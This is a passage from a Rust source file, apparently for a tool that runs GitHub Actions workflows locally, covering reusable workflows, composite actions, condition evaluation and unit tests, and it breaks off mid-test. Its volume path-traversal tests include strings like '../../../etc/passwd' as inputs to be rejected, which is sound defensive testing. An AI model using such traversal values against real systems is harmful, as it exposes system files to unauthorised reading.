            // Create child env context
            let mut child_env = ctx.env_context.clone();
            if let Some(with_map) = with {
                for (k, v) in with_map {
                    child_env.insert(format!("INPUT_{}", k.to_uppercase()), v.clone());
                }
            }
            if let Some(secrets_val) = secrets {
                if let Some(map) = secrets_val.as_mapping() {
                    for (k, v) in map {
                        if let (Some(key), Some(value)) = (k.as_str(), v.as_str()) {
                            child_env.insert(
                                format!("SECRET_{}", key.to_uppercase()),
                                value.to_string(),
                            );
                        }
                    }
                }
            }

            // Execute called workflow
            let plan = dependency::resolve_dependencies(&called)?;
            let mut all_results = Vec::new();
            let mut any_failed = false;
            for batch in plan {
                let results = execute_job_batch(
                    &batch,
                    &called,
                    ctx.runtime,
                    &child_env,
                    ctx.verbose,
                    None,
                    None,
                )
                .await?;
                for r in &results {
                    if r.status == JobStatus::Failure {
                        any_failed = true;
                    }
                }
                all_results.extend(results);
            }

            // Summarize into a single JobResult
            let mut logs = String::new();
            logs.push_str(&format!("Called workflow: {}\n", joined.display()));
            for r in &all_results {
                logs.push_str(&format!("- {}: {:?}\n", r.name, r.status));
            }

            // Represent as one summary step for UI
            let summary_step = StepResult {
                name: format!("Run reusable workflow: {}", uses),
                status: if any_failed {
                    StepStatus::Failure
                } else {
                    StepStatus::Success
                },
                output: logs.clone(),
            };

            return Ok(JobResult {
                name: ctx.job_name.to_string(),
                status: if any_failed {
                    JobStatus::Failure
                } else {
                    JobStatus::Success
                },
                steps: vec![summary_step],
                logs,
            });
        }
    };

    // Parse called workflow (for local paths)
    let called = parse_workflow(&workflow_path)?;

    // Create child env context
    let mut child_env = ctx.env_context.clone();
    if let Some(with_map) = with {
        for (k, v) in with_map {
            child_env.insert(format!("INPUT_{}", k.to_uppercase()), v.clone());
        }
    }
    if let Some(secrets_val) = secrets {
        if let Some(map) = secrets_val.as_mapping() {
            for (k, v) in map {
                if let (Some(key), Some(value)) = (k.as_str(), v.as_str()) {
                    child_env.insert(format!("SECRET_{}", key.to_uppercase()), value.to_string());
                }
            }
        }
    }

    // Execute called workflow
    let plan = dependency::resolve_dependencies(&called)?;
    let mut all_results = Vec::new();
    let mut any_failed = false;
    for batch in plan {
        let results = execute_job_batch(
            &batch,
            &called,
            ctx.runtime,
            &child_env,
            ctx.verbose,
            None,
            None,
        )
        .await?;
        for r in &results {
            if r.status == JobStatus::Failure {
                any_failed = true;
            }
        }
        all_results.extend(results);
    }

    // Summarize into a single JobResult
    let mut logs = String::new();
    logs.push_str(&format!("Called workflow: {}\n", workflow_path.display()));
    for r in &all_results {
        logs.push_str(&format!("- {}: {:?}\n", r.name, r.status));
    }

    // Represent as one summary step for UI
    let summary_step = StepResult {
        name: format!("Run reusable workflow: {}", uses),
        status: if any_failed {
            StepStatus::Failure
        } else {
            StepStatus::Success
        },
        output: logs.clone(),
    };

    Ok(JobResult {
        name: ctx.job_name.to_string(),
        status: if any_failed {
            JobStatus::Failure
        } else {
            JobStatus::Success
        },
        steps: vec![summary_step],
        logs,
    })
}

#[allow(dead_code)]
async fn prepare_runner_image(
    image: &str,
    runtime: &dyn ContainerRuntime,
    verbose: bool,
) -> Result<(), ExecutionError> {
    // Try to pull the image first
    if let Err(e) = runtime.pull_image(image).await {
        wrkflw_logging::warning(&format!("Failed to pull image {}: {}", image, e));
    }

    // Check if this is a language-specific runner
    let language_info = extract_language_info(image);
    if let Some((language, version)) = language_info {
        // Try to prepare a language-specific environment
        if let Ok(custom_image) = runtime
            .prepare_language_environment(language, version, None)
            .await
            .map_err(|e| ExecutionError::Runtime(e.to_string()))
        {
            if verbose {
                wrkflw_logging::info(&format!("Using customized image: {}", custom_image));
            }
            return Ok(());
        }
    }

    Ok(())
}

#[allow(dead_code)]
fn extract_language_info(image: &str) -> Option<(&'static str, Option<&str>)> {
    let image_lower = image.to_lowercase();

    // Check for language-specific images
    if image_lower.starts_with("python:") {
        Some(("python", Some(&image[7..])))
    } else if image_lower.starts_with("node:") {
        Some(("node", Some(&image[5..])))
    } else if image_lower.starts_with("eclipse-temurin:") {
        Some(("java", Some(&image[15..])))
    } else if image_lower.starts_with("golang:") {
        Some(("go", Some(&image[6..])))
    } else if image_lower.starts_with("mcr.microsoft.com/dotnet/sdk:") {
        Some(("dotnet", Some(&image[29..])))
    } else if image_lower.starts_with("rust:") {
        Some(("rust", Some(&image[5..])))
    } else {
        None
    }
}

async fn execute_composite_action(
    step: &workflow::Step,
    action_path: &Path,
    job_env: &HashMap<String, String>,
    working_dir: &Path,
    runtime: &dyn ContainerRuntime,
    runner_image: &str,
    verbose: bool,
) -> Result<StepResult, ExecutionError> {
    // Find the action definition file
    let action_yaml = action_path.join("action.yml");
    let action_yaml_alt = action_path.join("action.yaml");

    let action_file = if action_yaml.exists() {
        action_yaml
    } else if action_yaml_alt.exists() {
        action_yaml_alt
    } else {
        return Err(ExecutionError::Execution(format!(
            "No action.yml or action.yaml found in {}",
            action_path.display()
        )));
    };

    // Parse the composite action definition
    let action_content = fs::read_to_string(&action_file)
        .map_err(|e| ExecutionError::Execution(format!("Failed to read action file: {}", e)))?;

    let action_def: serde_yaml::Value = serde_yaml::from_str(&action_content)
        .map_err(|e| ExecutionError::Execution(format!("Invalid action YAML: {}", e)))?;

    // Check if it's a composite action
    match action_def.get("runs").and_then(|v| v.get("using")) {
        Some(serde_yaml::Value::String(using)) if using == "composite" => {
            // Get the steps
            let steps = match action_def.get("runs").and_then(|v| v.get("steps")) {
                Some(serde_yaml::Value::Sequence(steps)) => steps,
                _ => {
                    return Err(ExecutionError::Execution(
                        "Composite action is missing steps".to_string(),
                    ))
                }
            };

            // Process inputs from the calling step's 'with' parameters
            let mut action_env = job_env.clone();
            if let Some(inputs_def) = action_def.get("inputs") {
                if let Some(inputs_map) = inputs_def.as_mapping() {
                    for (input_name, input_def) in inputs_map {
                        if let Some(input_name_str) = input_name.as_str() {
                            // Get default value if available
                            let default_value = input_def
                                .get("default")
                                .and_then(|v| v.as_str())
                                .unwrap_or("");

                            // Check if the input was provided in the 'with' section
                            let input_value = step
                                .with
                                .as_ref()
                                .and_then(|with| with.get(input_name_str))
                                .unwrap_or(&default_value.to_string())
                                .clone();

                            // Add to environment as INPUT_X
                            action_env.insert(
                                format!("INPUT_{}", input_name_str.to_uppercase()),
                                input_value,
                            );
                        }
                    }
                }
            }

            // Execute each step
            let mut step_outputs = Vec::new();
            for (idx, step_def) in steps.iter().enumerate() {
                // Convert the YAML step to our Step struct
                let composite_step = match convert_yaml_to_step(step_def) {
                    Ok(step) => step,
                    Err(e) => {
                        return Err(ExecutionError::Execution(format!(
                            "Failed to process composite action step {}: {}",
                            idx + 1,
                            e
                        )))
                    }
                };

                // Execute the step - using Box::pin to handle async recursion
                let step_result = Box::pin(execute_step(StepExecutionContext {
                    step: &composite_step,
                    step_idx: idx,
                    job_env: &action_env,
                    working_dir,
                    runtime,
                    workflow: &workflow::WorkflowDefinition {
                        name: "Composite Action".to_string(),
                        on: vec![],
                        on_raw: serde_yaml::Value::Null,
                        jobs: HashMap::new(),
                        defaults: None,
                    },
                    runner_image,
                    verbose,
                    matrix_combination: &None,
                    secret_manager: None, // Composite actions don't have secrets yet
                    secret_masker: None,
                    container_config: None, // Composite actions don't use job containers
                    workflow_defaults: None,
                    job_defaults: None,
                }))
                .await?;

                // Add output to results
                step_outputs.push(format!("Step {}: {}", idx + 1, step_result.output));

                // Short-circuit on failure if needed
                if step_result.status == StepStatus::Failure {
                    return Ok(StepResult {
                        name: step
                            .name
                            .clone()
                            .unwrap_or_else(|| "Composite Action".to_string()),
                        status: StepStatus::Failure,
                        output: step_outputs.join("\n"),
                    });
                }
            }

            // All steps completed successfully
            let output = if verbose {
                let mut detailed_output = format!(
                    "Executed composite action from: {}\n\n",
                    action_path.display()
                );

                // Add information about the composite action if available
                if let Ok(action_content) =
                    serde_yaml::from_str::<serde_yaml::Value>(&action_content)
                {
                    if let Some(name) = action_content.get("name").and_then(|v| v.as_str()) {
                        detailed_output.push_str(&format!("Action name: {}\n", name));
                    }

                    if let Some(description) =
                        action_content.get("description").and_then(|v| v.as_str())
                    {
                        detailed_output.push_str(&format!("Description: {}\n", description));
                    }

                    detailed_output.push('\n');
                }

                // Add individual step outputs
                detailed_output.push_str("Step outputs:\n");
                for output in &step_outputs {
                    detailed_output.push_str(&format!("{}\n", output));
                }

                detailed_output
            } else {
                format!(
                    "Executed composite action with {} steps",
                    step_outputs.len()
                )
            };

            Ok(StepResult {
                name: step
                    .name
                    .clone()
                    .unwrap_or_else(|| "Composite Action".to_string()),
                status: StepStatus::Success,
                output,
            })
        }
        _ => Err(ExecutionError::Execution(
            "Action is not a composite action or has invalid format".to_string(),
        )),
    }
}

// Helper function to convert YAML step to our Step struct
fn convert_yaml_to_step(step_yaml: &serde_yaml::Value) -> Result<workflow::Step, String> {
    // Extract step properties
    let name = step_yaml
        .get("name")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let uses = step_yaml
        .get("uses")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let run = step_yaml
        .get("run")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let shell = step_yaml
        .get("shell")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let with = step_yaml.get("with").and_then(|v| v.as_mapping()).map(|m| {
        let mut with_map = HashMap::new();
        for (k, v) in m {
            if let (Some(key), Some(value)) = (k.as_str(), v.as_str()) {
                with_map.insert(key.to_string(), value.to_string());
            }
        }
        with_map
    });

    let env = step_yaml
        .get("env")
        .and_then(|v| v.as_mapping())
        .map(|m| {
            let mut env_map = HashMap::new();
            for (k, v) in m {
                if let (Some(key), Some(value)) = (k.as_str(), v.as_str()) {
                    env_map.insert(key.to_string(), value.to_string());
                }
            }
            env_map
        })
        .unwrap_or_default();

    // For composite steps with shell, construct a run step
    let final_run = run;

    // Extract continue_on_error
    let continue_on_error = step_yaml.get("continue-on-error").and_then(|v| v.as_bool());

    let if_condition = step_yaml
        .get("if")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let id = step_yaml
        .get("id")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let working_directory = step_yaml
        .get("working-directory")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let timeout_minutes = step_yaml.get("timeout-minutes").and_then(|v| v.as_f64());

    Ok(workflow::Step {
        name,
        uses,
        run: final_run,
        with,
        env,
        continue_on_error,
        if_condition,
        id,
        working_directory,
        shell,
        timeout_minutes,
    })
}

/// Evaluate a job condition expression
/// This is a simplified implementation that handles basic GitHub Actions expressions.
/// Note: step-level expressions like `steps.<id>.outcome`, `success()`, `failure()`,
/// `always()`, and `cancelled()` are not yet fully supported — a warning is emitted
/// and the condition defaults to its most likely state (`always()`/`success()` → true,
/// `failure()`/`cancelled()` → false).
fn evaluate_job_condition(
    condition: &str,
    env_context: &HashMap<String, String>,
    workflow: &WorkflowDefinition,
) -> bool {
    wrkflw_logging::debug(&format!("Evaluating condition: {}", condition));

    // Handle status functions and step references that we can't fully evaluate.
    // We default conservatively: only `always()` and `success()` resolve to true,
    // since those represent the common "run this step" intent. Bare `steps.*`
    // references (e.g. `steps.X.outcome == 'failure'`) default to false to avoid
    // running steps that depend on prior failure/output we can't evaluate.
    let has_always = condition.contains("always()");
    let has_success = condition.contains("success()");
    let has_failure = condition.contains("failure()");
    let has_cancelled = condition.contains("cancelled()");
    // Match "steps." only at word boundaries to avoid false positives on env var
    // names like "env.MY_STEPS_COUNT" or "env._STEPS_CHECK". We check for
    // start-of-string or a character that isn't alphanumeric/underscore before "steps.".
    let has_steps_ref = condition.match_indices("steps.").any(|(pos, _)| {
        pos == 0 || {
            let b = condition.as_bytes()[pos - 1];
            !b.is_ascii_alphanumeric() && b != b'_'
        }
    });
    let has_unsupported =
        has_always || has_success || has_failure || has_cancelled || has_steps_ref;

    if has_unsupported {
        wrkflw_logging::warning(&format!(
            "Condition '{}' uses status functions/step references not fully supported in local execution",
            condition
        ));

        // In GitHub Actions, `always()` means "run this step regardless of job
        // status" — it is a *scheduling* directive, not a boolean `true` literal.
        // Similarly, `success()` means "run when all previous steps succeeded".
        // Since we can't evaluate actual job/step status locally, we treat
        // `always()` and `success()` as "likely to run" → true, and `failure()`
        // / `cancelled()` as "unlikely" → false.
        //
        // Known limitation: compound expressions like `always() && failure()` will
        // return true (because `always()` is present) even though a real evaluator
        // would AND the two. This is acceptable because we lack step-status context
        // and would rather over-run than silently skip steps.
        if has_always || has_success {
            return true;
        }
        // Bare steps.* refs, failure(), cancelled() without positive counterpart → false
        return false;
    }

    // For now, implement basic pattern matching for common conditions
    // TODO: Implement a full GitHub Actions expression evaluator

    // Handle simple boolean conditions
    if condition == "true" {
        return true;
    }
    if condition == "false" {
        return false;
    }

    // Handle github.event.pull_request.draft == false
    if condition.contains("github.event.pull_request.draft == false") {
        // For local execution, assume this is always true (not a draft)
        return true;
    }

    // Handle needs.jobname.outputs.outputname == 'value' patterns
    if condition.contains("needs.") && condition.contains(".outputs.") {
        // For now, simulate that outputs are available but empty
        // This means conditions like needs.changes.outputs.source-code == 'true' will be false
        wrkflw_logging::debug(
            "Evaluating needs.outputs condition - defaulting to false for local execution",
        );
        return false;
    }

    // Default to true for unknown conditions to avoid breaking workflows
    wrkflw_logging::warning(&format!(
        "Unknown condition pattern: '{}' - defaulting to true",
        condition
    ));
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_git_sha_recognizes_valid_sha1() {
        assert!(is_git_sha("a81bbbf8298c0fa03ea29cdc473d45769f953675"));
    }

    #[test]
    fn is_git_sha_recognizes_uppercase_hex() {
        assert!(is_git_sha("A81BBBF8298C0FA03EA29CDC473D45769F953675"));
    }

    #[test]
    fn is_git_sha_rejects_short_hash() {
        assert!(!is_git_sha("a81bbbf"));
    }

    #[test]
    fn is_git_sha_rejects_branch_name() {
        assert!(!is_git_sha("main"));
    }

    #[test]
    fn is_git_sha_rejects_tag() {
        assert!(!is_git_sha("v4"));
    }

    #[test]
    fn is_git_sha_rejects_empty() {
        assert!(!is_git_sha(""));
    }

    #[test]
    fn is_git_sha_rejects_non_hex_40_chars() {
        assert!(!is_git_sha("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"));
    }

    #[test]
    fn is_git_sha_rejects_41_chars() {
        assert!(!is_git_sha("a81bbbf8298c0fa03ea29cdc473d45769f9536750"));
    }

    // --- get_effective_runner_image tests ---

    fn make_job(container: Option<JobContainer>, runs_on: Option<Vec<String>>) -> Job {
        Job {
            runs_on,
            needs: None,
            container,
            steps: Vec::new(),
            env: HashMap::new(),
            strategy: None,
            services: HashMap::new(),
            if_condition: None,
            outputs: None,
            permissions: None,
            uses: None,
            with: None,
            secrets: None,
            timeout_minutes: None,
            defaults: None,
        }
    }

    #[test]
    fn effective_runner_image_prefers_container() {
        let job = make_job(
            Some(JobContainer {
                image: "alpine:3.22".into(),
                credentials: None,
                env: HashMap::new(),
                ports: None,
                volumes: None,
                options: None,
            }),
            Some(vec!["ubuntu-latest".into()]),
        );
        assert_eq!(get_effective_runner_image(&job), "alpine:3.22");
    }

    #[test]
    fn effective_runner_image_falls_back_to_runs_on() {
        let job = make_job(None, Some(vec!["ubuntu-latest".into()]));
        let image = get_effective_runner_image(&job);
        // Should delegate to get_runner_image_from_opt, not return empty
        assert!(!image.is_empty());
    }

    // --- prepare_container_mounts tests ---

    #[test]
    fn container_mounts_docker_runtime_remaps_env_paths() {
        let mut step_env = HashMap::new();
        step_env.insert("WRKFLW_RUNTIME_MODE".into(), "docker".into());

        let mut job_env = HashMap::new();
        job_env.insert("GITHUB_ENV".into(), "/tmp/abc/github/env".into());
        job_env.insert("GITHUB_OUTPUT".into(), "/tmp/abc/github/output".into());
        job_env.insert("GITHUB_PATH".into(), "/tmp/abc/github/path".into());
        job_env.insert(
            "GITHUB_STEP_SUMMARY".into(),
            "/tmp/abc/github/step_summary".into(),
        );

        let (volumes, github_mount) = prepare_container_mounts(&mut step_env, &job_env, None);

        // Env vars should be remapped to container paths
        assert_eq!(step_env.get("GITHUB_ENV").unwrap(), "/github/workflow/env");
        assert_eq!(
            step_env.get("GITHUB_OUTPUT").unwrap(),
            "/github/workflow/output"
        );
        assert_eq!(
            step_env.get("GITHUB_PATH").unwrap(),
            "/github/workflow/path"
        );
        assert_eq!(
            step_env.get("GITHUB_STEP_SUMMARY").unwrap(),
            "/github/workflow/step_summary"
        );

        // Should mount the github dir at /github/workflow
        let (host, container) = github_mount.unwrap();
        assert_eq!(host, PathBuf::from("/tmp/abc/github"));
        assert_eq!(container, PathBuf::from("/github/workflow"));

        // No container config volumes
        assert!(volumes.is_empty());
    }

    #[test]
    fn container_mounts_non_container_runtime_does_not_remap() {
        let mut step_env = HashMap::new();
        // No WRKFLW_RUNTIME_MODE set

        let mut job_env = HashMap::new();
        job_env.insert("GITHUB_ENV".into(), "/tmp/abc/github/env".into());

        let (_volumes, github_mount) = prepare_container_mounts(&mut step_env, &job_env, None);

        // Env vars should NOT be remapped
        assert!(!step_env.contains_key("GITHUB_ENV"));

        // Should mount the parent directory identity-mapped
        let (host, container) = github_mount.unwrap();
        assert_eq!(host, container); // identity mount
    }

    #[test]
    fn container_mounts_no_github_env() {
        let mut step_env = HashMap::new();
        let job_env = HashMap::new(); // no GITHUB_ENV

        let (volumes, github_mount) = prepare_container_mounts(&mut step_env, &job_env, None);

        assert!(github_mount.is_none());
        assert!(volumes.is_empty());
    }

    #[test]
    fn container_mounts_parses_host_container_volumes() {
        let mut step_env = HashMap::new();
        let job_env = HashMap::new();

        let container = JobContainer {
            image: "node:18".into(),
            credentials: None,
            env: HashMap::new(),
            ports: None,
            volumes: Some(vec!["/host/data:/container/data".into()]),
            options: None,
        };

        let (volumes, _) = prepare_container_mounts(&mut step_env, &job_env, Some(&container));

        assert_eq!(volumes.len(), 1);
        assert_eq!(volumes[0].0, PathBuf::from("/host/data"));
        assert_eq!(volumes[0].1, PathBuf::from("/container/data"));
    }

    #[test]
    fn container_mounts_parses_single_path_volumes() {
        let mut step_env = HashMap::new();
        let job_env = HashMap::new();

        let container = JobContainer {
            image: "node:18".into(),
            credentials: None,
            env: HashMap::new(),
            ports: None,
            volumes: Some(vec!["/data".into()]),
            options: None,
        };

        let (volumes, _) = prepare_container_mounts(&mut step_env, &job_env, Some(&container));

        assert_eq!(volumes.len(), 1);
        assert_eq!(volumes[0].0, PathBuf::from("/data"));
        assert_eq!(volumes[0].1, PathBuf::from("/data"));
    }

    #[test]
    fn container_mounts_strips_docker_options_from_volumes() {
        let mut step_env = HashMap::new();
        let job_env = HashMap::new();

        let container = JobContainer {
            image: "node:18".into(),
            credentials: None,
            env: HashMap::new(),
            ports: None,
            volumes: Some(vec!["/host:/container:ro".into(), "/src:/dest:rw".into()]),
            options: None,
        };

        let (volumes, _) = prepare_container_mounts(&mut step_env, &job_env, Some(&container));

        assert_eq!(volumes.len(), 2);
        // :ro should be stripped — container path should be clean
        assert_eq!(volumes[0].0, PathBuf::from("/host"));
        assert_eq!(volumes[0].1, PathBuf::from("/container"));
        // :rw should be stripped
        assert_eq!(volumes[1].0, PathBuf::from("/src"));
        assert_eq!(volumes[1].1, PathBuf::from("/dest"));
    }

    #[test]
    fn container_mounts_podman_runtime_remaps_env_paths() {
        let mut step_env = HashMap::new();
        step_env.insert("WRKFLW_RUNTIME_MODE".into(), "podman".into());

        let mut job_env = HashMap::new();
        job_env.insert("GITHUB_ENV".into(), "/tmp/xyz/github/env".into());
        job_env.insert("GITHUB_OUTPUT".into(), "/tmp/xyz/github/output".into());
        job_env.insert("GITHUB_PATH".into(), "/tmp/xyz/github/path".into());
        job_env.insert(
            "GITHUB_STEP_SUMMARY".into(),
            "/tmp/xyz/github/step_summary".into(),
        );

        let (_, github_mount) = prepare_container_mounts(&mut step_env, &job_env, None);

        // Podman should behave identically to Docker for remapping
        assert_eq!(step_env.get("GITHUB_ENV").unwrap(), "/github/workflow/env");
        assert!(github_mount.is_some());
    }

    #[test]
    fn container_mounts_only_remaps_existing_env_keys() {
        let mut step_env = HashMap::new();
        step_env.insert("WRKFLW_RUNTIME_MODE".into(), "docker".into());

        let mut job_env = HashMap::new();
        // Only set GITHUB_ENV — the others are absent
        job_env.insert("GITHUB_ENV".into(), "/tmp/abc/github/env".into());

        let (_, _) = prepare_container_mounts(&mut step_env, &job_env, None);

        // GITHUB_ENV should be remapped
        assert_eq!(step_env.get("GITHUB_ENV").unwrap(), "/github/workflow/env");
        // Others should NOT be inserted (no phantom paths)
        assert!(!step_env.contains_key("GITHUB_OUTPUT"));
        assert!(!step_env.contains_key("GITHUB_PATH"));
        assert!(!step_env.contains_key("GITHUB_STEP_SUMMARY"));
    }

    #[test]
    fn effective_runner_image_empty_image_falls_back() {
        let job = make_job(
            Some(JobContainer {
                image: "".into(),
                credentials: None,
                env: HashMap::new(),
                ports: None,
                volumes: None,
                options: None,
            }),
            Some(vec!["ubuntu-latest".into()]),
        );
        let image = get_effective_runner_image(&job);
        // Should fall back to runs-on, not return empty string
        assert!(!image.is_empty());
    }

    #[test]
    fn container_mounts_skips_empty_container_path() {
        let mut step_env = HashMap::new();
        let job_env = HashMap::new();

        let container = JobContainer {
            image: "node:18".into(),
            credentials: None,
            env: HashMap::new(),
            ports: None,
            volumes: Some(vec!["/host:".into(), ":/container".into()]),
            options: None,
        };

        let (volumes, _) = prepare_container_mounts(&mut step_env, &job_env, Some(&container));

        // Both specs have an empty path component and should be skipped
        assert!(volumes.is_empty());
    }

    // --- container env precedence tests ---

    #[test]
    fn container_env_has_lowest_precedence() {
        // Simulate the env merging logic from execute_job:
        // 1. Container env is inserted with or_insert (lowest precedence)
        // 2. Job env is inserted with insert (overrides container env)
        let mut job_env = HashMap::new();

        // Step 1: container env (lowest precedence)
        let container = JobContainer {
            image: "node:18".into(),
            credentials: None,
            env: HashMap::from([
                ("SHARED".into(), "from-container".into()),
                ("CONTAINER_ONLY".into(), "container-value".into()),
            ]),
            ports: None,
            volumes: None,
            options: None,
        };
        for (key, value) in &container.env {
            job_env.entry(key.clone()).or_insert_with(|| value.clone());
        }

        // Step 2: job env (overrides container env)
        let job_level_env: HashMap<String, String> = HashMap::from([
            ("SHARED".into(), "from-job".into()),
            ("JOB_ONLY".into(), "job-value".into()),
        ]);
        for (key, value) in &job_level_env {
            job_env.insert(key.clone(), value.clone());
        }

        // Job-level env wins for shared keys
        assert_eq!(job_env.get("SHARED").unwrap(), "from-job");
        // Container-only keys are preserved
        assert_eq!(job_env.get("CONTAINER_ONLY").unwrap(), "container-value");
        // Job-only keys are preserved
        assert_eq!(job_env.get("JOB_ONLY").unwrap(), "job-value");
    }

    // --- evaluate_job_condition tests for step-level expressions ---

    fn empty_workflow() -> workflow::WorkflowDefinition {
        workflow::WorkflowDefinition {
            name: "test".to_string(),
            on: Vec::new(),
            on_raw: serde_yaml::Value::Null,
            jobs: HashMap::new(),
            defaults: None,
        }
    }

    #[test]
    fn condition_true_false_literals() {
        let env = HashMap::new();
        let wf = empty_workflow();
        assert!(evaluate_job_condition("true", &env, &wf));
        assert!(!evaluate_job_condition("false", &env, &wf));
    }

    #[test]
    fn condition_steps_reference_defaults_false() {
        let env = HashMap::new();
        let wf = empty_workflow();
        // Bare step-level expressions default to false (conservative — we can't evaluate them)
        assert!(!evaluate_job_condition(
            "steps.build.outcome == 'success'",
            &env,
            &wf
        ));
    }

    #[test]
    fn condition_success_function_defaults_true() {
        let env = HashMap::new();
        let wf = empty_workflow();
        assert!(evaluate_job_condition("success()", &env, &wf));
    }

    #[test]
    fn condition_failure_function_defaults_false() {
        let env = HashMap::new();
        let wf = empty_workflow();
        assert!(!evaluate_job_condition("failure()", &env, &wf));
    }

    #[test]
    fn condition_always_function_defaults_true() {
        let env = HashMap::new();
        let wf = empty_workflow();
        assert!(evaluate_job_condition("always()", &env, &wf));
    }

    #[test]
    fn condition_cancelled_function_defaults_false() {
        let env = HashMap::new();
        let wf = empty_workflow();
        assert!(!evaluate_job_condition("cancelled()", &env, &wf));
    }

    #[test]
    fn condition_compound_failure_or_success_defaults_true() {
        let env = HashMap::new();
        let wf = empty_workflow();
        // success() is present, so compound expression should default to true
        assert!(evaluate_job_condition("failure() || success()", &env, &wf));
    }

    #[test]
    fn condition_compound_failure_and_cancelled_defaults_false() {
        let env = HashMap::new();
        let wf = empty_workflow();
        // Only negative functions, no positive counterpart → false
        assert!(!evaluate_job_condition(
            "failure() || cancelled()",
            &env,
            &wf
        ));
    }

    #[test]
    fn condition_always_with_failure_defaults_true() {
        let env = HashMap::new();
        let wf = empty_workflow();
        // always() present → true regardless of other functions
        assert!(evaluate_job_condition("always() && failure()", &env, &wf));
    }

    #[test]
    fn condition_env_var_containing_steps_not_treated_as_step_ref() {
        let env = HashMap::new();
        let wf = empty_workflow();
        // "env.MY_STEPS_COUNT" contains "steps." as a substring but should NOT
        // trigger the step-reference heuristic (which returns false). Instead it
        // falls through to the unknown-condition default (true).
        // A bare "steps.build.outcome" at the start SHOULD be caught.
        assert!(evaluate_job_condition(
            "env.MY_STEPS_COUNT == '5'",
            &env,
            &wf
        ));
        // Underscore-prefixed names should also NOT be treated as step refs
        assert!(evaluate_job_condition(
            "env._STEPS_CHECK == 'ok'",
            &env,
            &wf
        ));
        assert!(!evaluate_job_condition(
            "steps.build.outcome == 'success'",
            &env,
            &wf
        ));
    }

    // --- volume path traversal tests ---

    fn has_path_traversal(host_path: &str) -> bool {
        std::path::Path::new(host_path)
            .components()
            .any(|c| matches!(c, std::path::Component::ParentDir))
    }

    #[test]
    fn volume_traversal_check_rejects_host_traversal() {
        assert!(has_path_traversal("../../../etc/passwd"));
        assert!(has_path_traversal("/safe/../etc/passwd"));
    }

    #[test]
    fn volume_traversal_check_allows_dotdot_in_container_path() {
        // Container path with ".." in it should NOT trigger the host check
        let vol_spec = "/safe/host:/container/..weird";
        let parts: Vec<&str> = vol_spec.splitn(3, ':').collect();
        assert!(!has_path_traversal(parts[0]));
    }

    #[test]
    fn volume_traversal_allows_double_dot_prefix_dir() {
        // A directory literally named "..hidden" is not path traversal
        assert!(!has_path_traversal("/data/..hidden/files"));
    }

    // --- PreparedAction / NativeDocker tests ---

    #[test]
    fn prepared_action_native_docker_stores_fields() {
        let pa = PreparedAction::NativeDocker {
            image: "ghcr.io/super-linter:latest".to_string(),
            entrypoint: Some("/entrypoint.sh".to_string()),
            args: vec!["--flag".to_string(), "value".to_string()],
        };
        match pa {
            PreparedAction::NativeDocker {
                image,
                entrypoint,
                args,
            } => {
                assert_eq!(image, "ghcr.io/super-linter:latest");
                assert_eq!(entrypoint.as_deref(), Some("/entrypoint.sh"));
                assert_eq!(args, vec!["--flag", "value"]);
            }
            _ => panic!("expected NativeDocker variant"),
        }
    }

    #[test]
    fn prepared_action_native_docker_defaults() {
        let pa = PreparedAction::NativeDocker {
            image: "alpine:latest".to_string(),
            entrypoint: None,
            args: vec![],
        };
        match pa {
            PreparedAction::NativeDocker {
                entrypoint, args, ..
            } => {
                assert!(entrypoint.is_none());
                assert!(args.is_empty());
            }
            _ => panic!("expected NativeDocker variant"),
        }
    }

    // --- extract_docker_runs_config tests ---

    #[test]
    fn extract_runs_config_with_entrypoint_and_args() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  entrypoint: /entrypoint.sh
  args:
    - --flag
    - value
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert_eq!(ep.as_deref(), Some("/entrypoint.sh"));
        assert_eq!(args, vec!["--flag", "value"]);
    }

    #[test]
    fn extract_runs_config_missing_both() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert!(ep.is_none());
        assert!(args.is_empty());
    }

    #[test]
    fn extract_runs_config_none_definition() {
        let (ep, args) = extract_docker_runs_config(None).unwrap();
        assert!(ep.is_none());
        assert!(args.is_empty());
    }

    #[test]
    fn extract_runs_config_entrypoint_only() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  entrypoint: /custom.sh
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert_eq!(ep.as_deref(), Some("/custom.sh"));
        assert!(args.is_empty());
    }

    #[test]
    fn extract_runs_config_args_only() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  args:
    - hello
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert!(ep.is_none());
        assert_eq!(args, vec!["hello"]);
    }

    #[test]
    fn extract_runs_config_args_as_string() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  args: "--flag value 'quoted arg'"
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert!(ep.is_none());
        assert_eq!(args, vec!["--flag", "value", "quoted arg"]);
    }

    #[test]
    fn extract_runs_config_args_as_plain_string() {
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
  args: hello
"#,
        )
        .unwrap();
        let (ep, args) = extract_docker_runs_config(Some(&yaml)).unwrap();
        assert!(ep.is_none());
        assert_eq!(args, vec!["hello"]);
    }

    #[test]
    fn extract_runs_config_args_string_bad_quoting_is_error() {
        // Unmatched quote — should return an error (consistent with with.args parsing)
        let yaml: serde_yaml::Value = serde_yaml::from_str(
            r#"
runs:
  using: docker
  image: Dockerfile
